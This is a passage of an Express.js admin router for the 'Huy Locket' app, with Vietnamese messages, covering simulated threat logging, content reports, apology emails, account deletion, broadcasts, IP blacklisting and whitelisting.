      details = "Phát hiện ý đồ truy cập trái phép tệp tin hệ thống máy chủ (Path Traversal)";
      severity = "CRITICAL";
    }

    await require("../services/userActivityStore").recordSecurityThreat({
      threatType,
      severity,
      targetEndpoint: "/api/locket/feed",
      attackerIp: ip,
      userUid: "PEN_TEST_SIMULATOR",
      userEmail: req.headers["x-user-email"] || "admin-tester@huy-locket.net",
      userAgent: req.headers["user-agent"] || "Antigravity Pen-Test Security Tool/2.0",
      details,
      payloadSample: sample,
      status: "BLOCKED",
    });
    
    await audit(req, "SIMULATE_SECURITY_THREAT", threatType, `Simulated security threat test: ${threatType}`);
    return res.status(200).json({ success: true, message: `Đã mô phỏng phát hiện và chặn thành công tấn công ${threatType}!` });
  } catch (err) {
    console.error("Failed to simulate security threat:", err?.message || "unknown");
    return res.status(500).json({ success: false, error: "Lỗi khi chạy thử nghiệm tấn công" });
  }
});

router.delete("/security-threats", requireActivityDatabase, requireActiveAdminSession, async (req, res) => {
  try {
    const id = String(req.query.id || "ALL").trim();
    await clearSecurityThreats(id);
    await audit(req, "CLEAR_SECURITY_THREATS", id, `Cleared security threats log for ${id}`);
    return res.status(200).json({ success: true, message: "Đã xóa bản ghi cảnh báo tấn công bảo mật!" });
  } catch (error) {
    console.error("Failed to clear security threats:", error?.message || "unknown");
    return res.status(500).json({ success: false, error: "Lỗi khi xóa bản ghi tường lửa" });
  }
});

router.get("/content/reports", requireActivityDatabase, async (req, res) => {
  res.setHeader("Cache-Control", "no-store, max-age=0");
  if (req.adminRole === "support") {
    return res.status(403).json({ success: false, error: "Quyền Support không được truy cập quản lý vi phạm" });
  }
  try {
    const status = String(req.query.status || "").trim();
    const reports = await listReportedContent({ status, limit: 100 });
    return res.status(200).json({ success: true, reports });
  } catch (error) {
    console.error("Failed to list reported content:", error?.message || "unknown");
    return res.status(500).json({ success: false, error: "Không thể tải danh sách báo cáo vi phạm" });
  }
});

router.post("/content/reports/:id/resolve", requireActivityDatabase, requireActiveAdminSession, async (req, res) => {
  res.setHeader("Cache-Control", "no-store, max-age=0");
  if (req.adminRole !== "super_admin" && req.adminRole !== "admin" && req.adminRole !== "moderator") {
    return res.status(403).json({ success: false, error: "Quyền Support không được phép xử lý vi phạm" });
  }
  try {
    const actionTaken = String(req.body?.actionTaken || "dismissed").trim();
    const ok = await resolveReport({ id: req.params.id, actionTaken, resolvedBy: req.adminUid });
    if (!ok) return res.status(404).json({ success: false, error: "Báo cáo vi phạm không tồn tại" });
    await audit(req, "RESOLVE_REPORT", null, `Resolved report #${req.params.id} with action: ${actionTaken}`);
    return res.status(200).json({ success: true });
  } catch (error) {
    console.error("Failed to resolve reported content:", error?.message || "unknown");
    return res.status(500).json({ success: false, error: "Không thể xử lý báo cáo vi phạm" });
  }
});

router.post("/apology-email", requireActivityDatabase, requireActiveAdminSession, async (req, res) => {
  res.setHeader("Cache-Control", "no-store, max-age=0");
  if (req.adminRole !== "super_admin" && req.adminRole !== "admin") {
    return res.status(403).json({
      success: false,
      code: "ADMIN_PERMISSION_REQUIRED",
      error: "Chỉ Admin hoặc Super Admin mới được gửi email xin lỗi cho người dùng",
    });
  }

  const targetEmail = String(req.body?.email || "").trim().toLowerCase();
  if (!targetEmail || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(targetEmail)) {
    return res.status(400).json({
      success: false,
      code: "EMAIL_ADDRESS_INVALID",
      error: "Vui lòng nhập địa chỉ email người dùng hợp lệ",
    });
  }

  try {
    const result = await listWebUsers({ search: targetEmail, limit: 20, offset: 0 });
    const user = (result.users || []).find(
      (entry) => String(entry.email || "").trim().toLowerCase() === targetEmail,
    );
    if (!user) {
      return res.status(404).json({
        success: false,
        code: "USER_NOT_FOUND",
        error: "Không tìm thấy email này trong danh sách người dùng Huy Locket",
      });
    }

    const targetRole = String(user.role || "user").trim().toLowerCase();
    if (targetRole !== "user" || isAdminIdentity(user.uid, targetEmail)) {
      return res.status(403).json({
        success: false,
        code: "PROTECTED_ADMIN",
        error: "Không gửi email xin lỗi khóa nhầm cho tài khoản quản trị",
      });
    }

    const accountStatus = String(user.account_status || user.accountStatus || "active").trim().toLowerCase();
    if (accountStatus === "locked" || user.disabled === true) {
      return res.status(409).json({
        success: false,
        code: "ACCOUNT_STILL_LOCKED",
        error: "Tài khoản này vẫn đang bị khóa. Hãy mở khóa trước khi gửi email xin lỗi.",
      });
    }

    const requestId = String(req.body?.requestId || crypto.randomUUID()).trim().slice(0, 120);
    const sendResult = await sendAdminApologyEmail({
      email: targetEmail,
      displayName: user.display_name || user.displayName || user.username || "",
      uid: user.uid || "",
      idempotencyKey: `admin-general-apology:${user.uid || targetEmail}:${requestId}`,
    });

    await audit(req, "SEND_ACCOUNT_APOLOGY_EMAIL", user.uid || null, `Sent general account apology email to ${targetEmail}`);
    return res.status(200).json({
      success: true,
      message: "Đã gửi email xin lỗi tới người dùng.",
      uid: user.uid || null,
      email: targetEmail,
      provider: sendResult.provider,
      messageId: sendResult.messageId || null,
      deduped: Boolean(sendResult.deduped),
    });
  } catch (error) {
    console.error("Failed to send general admin apology email:", error?.code || error?.message || "unknown");
    await audit(
      req,
      "SEND_ACCOUNT_APOLOGY_EMAIL",
      null,
      `Failed to send general apology email to ${targetEmail}: ${error?.code || error?.message || "unknown"}`,
      "failure",
    );
    const status = Number(error?.status) || 502;
    return res.status(status >= 400 && status < 600 ? status : 502).json({
      success: false,
      code: error?.code || "EMAIL_SEND_FAILED",
      error: error?.message || "Không thể gửi email xin lỗi tới người dùng",
    });
  }
});

router.post("/users/:uid/apology-email", requireActivityDatabase, requireActiveAdminSession, async (req, res) => {
  res.setHeader("Cache-Control", "no-store, max-age=0");
  if (req.adminRole !== "super_admin" && req.adminRole !== "admin") {
    return res.status(403).json({
      success: false,
      code: "ADMIN_PERMISSION_REQUIRED",
      error: "Chỉ Admin hoặc Super Admin mới được gửi email xin lỗi cho người dùng",
    });
  }

  const targetUid = String(req.params.uid || "").trim();
  if (!targetUid) {
    return res.status(400).json({ success: false, code: "USER_UID_REQUIRED", error: "Thiếu UID người dùng" });
  }

  try {
    const user = await getWebUser(targetUid);
    if (!user) {
      return res.status(404).json({ success: false, code: "USER_NOT_FOUND", error: "Không tìm thấy người dùng trong hệ thống Huy Locket" });
    }

    const targetEmail = String(user.email || "").trim().toLowerCase();
    const targetRole = String(user.role || "user").trim().toLowerCase();
    if (targetRole !== "user" || isAdminIdentity(user.uid, targetEmail)) {
      return res.status(403).json({ success: false, code: "PROTECTED_ADMIN", error: "Không gửi email xin lỗi khóa nhầm cho tài khoản quản trị" });
    }
    if (!targetEmail) {
      return res.status(400).json({ success: false, code: "EMAIL_ADDRESS_REQUIRED", error: "Tài khoản này chưa có email để gửi lời xin lỗi" });
    }

    const accountStatus = String(user.account_status || user.accountStatus || "active").trim().toLowerCase();
    if (accountStatus === "locked" || user.disabled === true) {
      return res.status(409).json({
        success: false,
        code: "ACCOUNT_STILL_LOCKED",
        error: "Hãy mở khóa tài khoản trước, sau đó bấm Gửi xin lỗi để email không thông báo sai trạng thái.",
      });
    }

    const requestId = String(req.body?.requestId || crypto.randomUUID()).trim().slice(0, 120);
    const result = await sendAdminApologyEmail({
      email: targetEmail,
      displayName: user.display_name || user.displayName || user.username || "",
      uid: user.uid || targetUid,
      idempotencyKey: `admin-apology:${targetUid}:${requestId}`,
    });

    await audit(req, "SEND_ACCOUNT_APOLOGY_EMAIL", targetUid, `Sent account lock apology email to ${targetEmail}`);
    return res.status(200).json({
      success: true,
      message: "Đã gửi email xin lỗi tới người dùng.",
      provider: result.provider,
      messageId: result.messageId || null,
      deduped: Boolean(result.deduped),
    });
  } catch (error) {
    console.error("Failed to send admin apology email:", error?.code || error?.message || "unknown");
    await audit(
      req,
      "SEND_ACCOUNT_APOLOGY_EMAIL",
      targetUid,
      `Failed to send account apology email: ${error?.code || error?.message || "unknown"}`,
      "failure",
    );
    const status = Number(error?.status) || 502;
    return res.status(status >= 400 && status < 600 ? status : 502).json({
      success: false,
      code: error?.code || "EMAIL_SEND_FAILED",
      error: error?.message || "Không thể gửi email xin lỗi tới người dùng",
    });
  }
});

router.delete("/users/:uid/auth", requireActiveAdminSession, async (req, res) => {
  res.setHeader("Cache-Control", "no-store, max-age=0");
  if (req.adminRole !== "super_admin" && req.adminRole !== "admin") {
    return res.status(403).json({ success: false, error: "Quyền Moderator hoặc Support không được xóa tài khoản" });
  }
  if (req.params.uid === req.adminUid) {
    return res.status(403).json({ success: false, error: "Không được tự xóa tài khoản của chính mình" });
  }
  if (await isProtectedAdmin(req.params.uid)) {
    return res.status(403).json({ success: false, code: "PROTECTED_ADMIN", error: "Cannot delete the protected admin account" });
  }
  const adminAuth = getAdminAuth();
  if (!adminAuth) {
    return res.status(503).json({ success: false, code: "ADMIN_FIREBASE_UNAVAILABLE", error: "Admin Firebase is unavailable" });
  }
  try {
    await adminAuth.getUser(req.params.uid);
    await adminAuth.deleteUser(req.params.uid);
    await audit(req, "DELETE_ADMIN_IDENTITY", req.params.uid, "Deleted Huy Locket admin Firebase identity");
    return res.status(200).json({ success: true });
  } catch (error) {
    if (error?.code === "auth/user-not-found") {
      return res.status(409).json({
        success: false,
        code: "OFFICIAL_LOCKET_ACCOUNT",
        error: "Official Locket accounts cannot be deleted from Huy Locket",
      });
    }
    console.error("Failed to delete admin identity:", error?.code || error?.name || "unknown");
    return res.status(500).json({ success: false, code: "DELETE_FAILED", error: "Unable to delete admin identity" });
  }
});

router.get("/broadcast", async (req, res) => {
  try {
    const data = await getGlobalBroadcast();
    const list = await listGlobalBroadcasts();
    res.json({ success: true, data, list });
  } catch (err) {
    res.json({ success: false, error: err?.message });
  }
});

router.post("/broadcast", requireActiveAdminSession, async (req, res) => {
  try {
    const { id, message, level, active, targetUser, action } = req.body || {};
    if (action === "toggle" && id) {
      const result = await toggleGlobalBroadcast(id, active);
      await audit(req, "TOGGLE_GLOBAL_BROADCAST", null, `Toggled broadcast #${id} to ${active ? "ACTIVE" : "OFF"}`);
      return res.json({ success: true, data: result });
    }
    if (action === "delete" && id) {
      const result = await deleteGlobalBroadcast(id);
      await audit(req, "DELETE_GLOBAL_BROADCAST", null, `Deleted broadcast #${id}`);
      return res.json({ success: true, data: result });
    }
    const result = await setGlobalBroadcast(message || "", level || "info", Boolean(active ?? true), targetUser || "ALL");
    if (!result || !result.success) {
      return res.status(500).json({ success: false, error: result?.error || "Không thể lưu vào CSDL" });
    }
    await audit(req, "SET_GLOBAL_BROADCAST", null, `Created global broadcast (${targetUser || "ALL"}): "${message}"`);
    res.json({ success: true, data: result });
  } catch (err) {
    console.error("POST /broadcast error:", err);
    res.status(500).json({ success: false, error: err?.message || "Lỗi xử lý máy chủ" });
  }
});

router.delete("/broadcast/:id", requireActiveAdminSession, async (req, res) => {
  try {
    const { id } = req.params;
    const result = await deleteGlobalBroadcast(id);
    await audit(req, "DELETE_GLOBAL_BROADCAST", null, `Deleted broadcast #${id}`);
    res.json({ success: true, data: result });
  } catch (err) {
    res.status(500).json({ success: false, error: err?.message });
  }
});

router.get("/ip-blacklist", async (req, res) => {
  const list = await listBlacklistedIps();
  res.json({ success: true, count: list.length, list });
});

router.post("/ip-blacklist", requireActiveAdminSession, async (req, res) => {
  const { ip_address, reason } = req.body;
  if (!ip_address) return res.status(400).json({ success: false, error: "Thiếu IP address" });
  await addIpBlacklist(ip_address, reason || "Khóa từ Admin Panel", req.adminRole || "SUPER_ADMIN");
  await audit(req, "BAN_IP_ADDRESS", null, `Banned IP: ${ip_address} - Reason: ${reason || "Banned by Admin"}`);
  res.json({ success: true, message: `Đã cấm vĩnh viễn địa chỉ IP: ${ip_address}` });
});

router.delete("/ip-blacklist/:ip", requireActiveAdminSession, async (req, res) => {
  const ip = decodeURIComponent(req.params.ip);
  await removeIpBlacklist(ip);
  await audit(req, "UNBAN_IP_ADDRESS", null, `Unbanned IP: ${ip}`);
  res.json({ success: true, message: `Đã mở khóa IP: ${ip}` });
});

router.delete("/users/:uid/nuke", requireActiveAdminSession, async (req, res) => {
  if (req.adminRole !== "super_admin" && req.adminRole !== "admin") {
    return res.status(403).json({ success: false, error: "Quyền Moderator hoặc Support không được nuke tài khoản" });
  }
  const targetUid = req.params.uid;
  if (targetUid === req.adminUid) {
    return res.status(403).json({ success: false, error: "Không thể xóa chính tài khoản Admin của mình" });
  }
  if (await isProtectedAdmin(targetUid)) {
    return res.status(403).json({ success: false, error: "Đây là tài khoản bảo vệ tối thượng (Protected Admin), không thể xóa!" });
  }
  await nukeUserPermanently(targetUid);
  await audit(req, "NUKE_USER_PERMANENTLY", targetUid, "Permanently deleted user and all login histories");
  res.json({ success: true, message: "Đã tiêu hủy vĩnh viễn toàn bộ hồ sơ và lịch sử tài khoản khỏi cơ sở dữ liệu Huy Locket!" });
});

router.get("/server-health", async (req, res) => {
  const health = await getServerHealthStats();
  res.json({ success: true, data: health });
});

router.get("/users/:uid/password-status", async (req, res) => {
  const u = await getWebUser(req.params.uid);
  if (!u) return res.status(404).json({ success: false, error: "Không tìm thấy người dùng trong hệ thống Huy Locket" });
  const status = getUserPasswordRecoveryStatus(u.email);
  res.json({ success: true, data: { uid: u.uid, displayName: u.displayName || u.email, ...status } });
});

router.get("/whitelist", async (req, res) => {
  try {
    const rows = await listWhitelist();
    res.json({ success: true, list: rows });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

router.post("/whitelist", async (req, res) => {
  try {
    const { identifier, type } = req.body || {};
    if (!identifier) return res.status(400).json({ success: false, error: "Thiếu identifier" });
    await addWhitelist(identifier, type || "email", req.adminEmail || "SUPER_ADMIN");
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

router.delete("/whitelist/:identifier", async (req, res) => {
  try {
    await removeWhitelist(decodeURIComponent(req.params.identifier));
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

module.exports = router;
